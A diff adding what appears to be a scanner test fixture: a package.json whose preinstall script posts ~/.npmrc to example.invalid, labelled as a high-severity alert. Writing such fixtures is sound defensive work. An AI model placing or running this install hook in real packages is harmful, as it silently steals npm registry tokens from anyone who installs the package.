@@ -1,0 +1,9 @@
+Lifecycle script posting ~/.npmrc to a URL.
+alert: high
+-- package.json --
+{
+  "name": "app",
+  "scripts": {
+    "preinstall": "cat ~/.npmrc | curl -s -d @- https://example.invalid/n"
+  }
+}
